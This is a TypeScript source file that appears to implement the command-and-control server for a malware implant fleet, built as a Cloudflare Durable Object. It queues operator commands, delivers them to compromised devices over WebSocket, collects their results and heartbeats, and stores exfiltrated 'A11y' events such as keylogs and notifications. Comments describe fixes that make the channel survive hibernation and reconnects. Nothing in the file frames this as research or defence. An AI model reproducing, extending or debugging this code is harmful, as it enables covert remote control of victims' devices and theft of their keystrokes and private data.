import { DurableObject } from 'cloudflare:workers';

interface Env {
  STORAGE: R2Bucket;
  FLEET_CONFIG: KVNamespace;
  OPERATOR_PUBKEY: string;
}

interface CommandResult {
  id: string;
  cmd: string;
  data: string;
  ts: number;
}

export class ImplantDO extends DurableObject {
  private sessions: Map<string, { connectedAt: number; lastPing: number }>;
  private lastHeartbeat: number = 0;
  private implantInfo: any = null;

  constructor(state: DurableObjectState, env: Env) {
    super(state, env);
    this.sessions = new Map();
    this.ctx.storage.sql.exec(
      `CREATE TABLE IF NOT EXISTS command_queue (
        id TEXT PRIMARY KEY,
        command TEXT NOT NULL,
        payload TEXT,
        status TEXT DEFAULT 'pending',
        result TEXT,
        queued_at INTEGER,
        completed_at INTEGER
      )`
    );
    this.ctx.storage.sql.exec(
      `CREATE TABLE IF NOT EXISTS implant_events (
        id INTEGER PRIMARY KEY AUTOINCREMENT,
        type TEXT,
        tag TEXT,
        data TEXT,
        ts INTEGER
      )`
    );
    // lastHeartbeat / implantInfo used to live only on the instance, so every DO
    // eviction (routine under hibernation) silently reset them to 0/null and the
    // operator showed an online implant as OFFLINE. Persist them instead.
    this.ctx.storage.sql.exec(
      `CREATE TABLE IF NOT EXISTS implant_meta (
        key TEXT PRIMARY KEY,
        value TEXT,
        updated_at INTEGER
      )`
    );
  }

  private setMeta(key: string, value: string): void {
    this.ctx.storage.sql.exec(
      `INSERT INTO implant_meta (key, value, updated_at) VALUES (?, ?, ?)
       ON CONFLICT(key) DO UPDATE SET value = excluded.value, updated_at = excluded.updated_at`,
      key, value, Date.now()
    );
  }

  private getMeta(key: string): string | null {
    const rows = this.ctx.storage.sql.exec(
      `SELECT value FROM implant_meta WHERE key = ?`, key
    ).toArray();
    return rows.length > 0 ? String(rows[0].value) : null;
  }

  async fetch(request: Request): Promise<Response> {
    const url = new URL(request.url);

    // WebSocket upgrade from implant. Accept either signal: the raw Upgrade header,
    // or an attached socket (which is what actually survives a Worker <-> DO hop).
    if (request.headers.get('Upgrade') === 'websocket' ||
        (request as unknown as { webSocket?: WebSocket }).webSocket) {
      return this.handleWebSocketUpgrade(request, url.pathname.split('/')[2] || 'wss');
    }

    // RPC from the Worker (operator commands, result polling)
    if (url.pathname === '/rpc' && request.method === 'POST') {
      const body = await request.json();
      return this.handleOperatorRPC(body);
    }

    return new Response('Not found', { status: 404 });
  }

  private handleWebSocketUpgrade(request: Request, _transportType: string): Response {
    // The Worker forwards the *client's* request with `stub.fetch(c.req.raw)`, so the
    // real implant socket arrives as `request.webSocket`. Building a fresh WebSocketPair
    // here (as this used to) accepts an orphan socket, leaves the implant's socket
    // unaccepted (Cloudflare closes it when this handler returns), keeps
    // getWebSockets() empty, and drops every frame — including flushQueue()'s output.
    // `webSocket` lives on workers-types' WebSocketRequest, not the base Request.
    const server = (request as unknown as { webSocket?: WebSocket }).webSocket;
    if (!server) {
      // Diagnostic: tell the Worker exactly what arrived so a handoff regression
      // is readable from outside instead of guessing from a bare 400.
      return new Response(
        `no socket on DO request upgrades=${String(request.headers.get('Upgrade'))}`,
        { status: 400 });
    }

    // Hibernatable: the DO stays stateless between frames and is not billed while idle.
    this.ctx.acceptWebSocket(server, ['implant']);

    const now = Date.now();
    this.sessions.set('primary', { connectedAt: now, lastPing: now });
    this.setMeta('connected_at', String(now));

    // Flush pending commands to the implant upon connection
    this.flushQueue(server);

    // 101 with no `webSocket` body: the socket is already attached to this DO,
    // and the Worker returns the client half to the implant.
    return new Response(null, { status: 101 });
  }

  private handleOperatorRPC(body: any): Response {
    const { command, payload } = body;

    switch (command) {
      case 'send_command': {
        const cmdId = crypto.randomUUID();
        this.ctx.storage.sql.exec(
          `INSERT INTO command_queue (id, command, payload, status, queued_at) VALUES (?, ?, ?, 'pending', ?)`,
          cmdId, payload?.command || '', JSON.stringify(payload?.payload || {}), Date.now()
        );
        // Send to connected implant immediately
        let sent = false;
        for (const ws of this.ctx.getWebSockets()) {
          if (ws.readyState === WebSocket.OPEN) {
            const frame = JSON.stringify({
              id: cmdId,
              c: payload?.command,
              p: payload?.payload || {},
            });
            ws.send(frame);
            sent = true;
            this.ctx.storage.sql.exec(
              `UPDATE command_queue SET status = 'sent' WHERE id = ?`, cmdId
            );
            break;
          }
        }
        return new Response(JSON.stringify({ success: true, cmdId, sent }), {
          headers: { 'Content-Type': 'application/json' },
        });
      }

      case 'get_result': {
        const { cmdId } = payload || {};
        if (cmdId) {
          const rows = this.ctx.storage.sql.exec(
            `SELECT id, command, status, result, completed_at FROM command_queue WHERE id = ?`,
            cmdId
          ).toArray();
          if (rows.length > 0) {
            return new Response(JSON.stringify({
              success: true,
              result: {
                id: rows[0].id,
                status: rows[0].status,
                data: rows[0].result,
                completedAt: rows[0].completed_at,
              }
            }), {
              headers: { 'Content-Type': 'application/json' },
            });
          }
          return new Response(JSON.stringify({ success: true, result: null }), {
            headers: { 'Content-Type': 'application/json' },
          });
        }
        // Return all recent results
        const results = this.ctx.storage.sql.exec(
          `SELECT id, command, status, result, completed_at FROM command_queue
           WHERE status = 'completed' ORDER BY completed_at DESC LIMIT 50`
        ).toArray();
        return new Response(JSON.stringify({ success: true, results }), {
          headers: { 'Content-Type': 'application/json' },
        });
      }

      case 'get_status': {
        const sockets = this.ctx.getWebSockets();
        const hb = parseInt(this.getMeta('last_heartbeat') || '0');
        const infoStr = this.getMeta('implant_info');
        let info = this.implantInfo;
        if (infoStr) {
          try { info = JSON.parse(infoStr); } catch { /* keep in-memory value */ }
        }
        return new Response(JSON.stringify({
          success: true,
          status: {
            connected: sockets.length > 0,
            sessions: sockets.length,
            lastHeartbeat: hb || this.lastHeartbeat,
            implantInfo: info,
            pendingCommands: this.ctx.storage.sql.exec(
              `SELECT COUNT(*) as count FROM command_queue WHERE status IN ('pending','sent')`
            ).toArray()[0]?.count || 0,
          }
        }), {
          headers: { 'Content-Type': 'application/json' },
        });
      }

      case 'get_events': {
        const events = this.ctx.storage.sql.exec(
          `SELECT * FROM implant_events ORDER BY ts DESC LIMIT 100`
        ).toArray();
        return new Response(JSON.stringify({ success: true, events }), {
          headers: { 'Content-Type': 'application/json' },
        });
      }

      default:
        return new Response(JSON.stringify({ error: `Unknown command: ${command}` }), {
          status: 400,
          headers: { 'Content-Type': 'application/json' },
        });
    }
  }

  private flushQueue(ws: WebSocket) {
    const pending = this.ctx.storage.sql.exec(
      `SELECT id, command, payload FROM command_queue WHERE status = 'pending'`
    ).toArray();
    for (const row of pending) {
      const frame = JSON.stringify({
        id: row.id as string,
        c: row.command as string,
        p: JSON.parse(String(row.payload || '{}')),
      });
      ws.send(frame);
      this.ctx.storage.sql.exec(
        `UPDATE command_queue SET status = 'sent' WHERE id = ?`, row.id
      );
    }
  }

  // --- WebSocket Hibernation Handlers ---

  async webSocketMessage(ws: WebSocket, message: string | ArrayBuffer) {
    try {
      const raw = typeof message === 'string' ? message : new TextDecoder().decode(message);
      const parsed = JSON.parse(raw);

      if (parsed.type === 'heartbeat') {
        this.lastHeartbeat = parsed.ts || Date.now();
        if (parsed.info) this.implantInfo = parsed.info;
        this.setMeta('last_heartbeat', String(this.lastHeartbeat));
        if (parsed.info) this.setMeta('implant_info', JSON.stringify(parsed.info));
        this.sessions.set('primary', {
          connectedAt: this.sessions.get('primary')?.connectedAt || Date.now(),
          lastPing: Date.now(),
        });
        return;
      }

      if (parsed.type === 'result' && parsed.id) {
        // Implant executed a command — store the result
        this.ctx.storage.sql.exec(
          `UPDATE command_queue SET status = 'completed', result = ?, completed_at = ? WHERE id = ?`,
          parsed.data || '', parsed.ts || Date.now(), parsed.id
        );
        return;
      }

      if (parsed.type === 'event') {
        // A11y exfil event (keylog, notification, etc.)
        this.ctx.storage.sql.exec(
          `INSERT INTO implant_events (type, tag, data, ts) VALUES (?, ?, ?, ?)`,
          parsed.type, parsed.tag || 'unknown', parsed.data || '', Date.now()
        );
        return;
      }

      if (parsed.type === 'handshake_response') {
        this.implantInfo = { ...this.implantInfo, pub: parsed.pub };
        return;
      }
    } catch (e) {
      console.error('Invalid frame from implant:', e);
    }
  }

  async webSocketClose(_ws: WebSocket, _code: number, _reason: string, _wasClean: boolean) {
    this.sessions.clear();
    // Only mark disconnected once the *last* socket is gone, otherwise a reconnect
    // that races the old socket's close would flip a live implant to offline.
    if (this.ctx.getWebSockets().length === 0) {
      this.setMeta('disconnected_at', String(Date.now()));
    }
  }

  async webSocketError(ws: WebSocket, _error: unknown) {
    // Without this handler an errored socket stays in getWebSockets() forever,
    // so get_status would report a dead implant as connected.
    try { ws.close(); } catch { /* already closing */ }
    this.sessions.clear();
    if (this.ctx.getWebSockets().length === 0) {
      this.setMeta('disconnected_at', String(Date.now()));
    }
  }
}
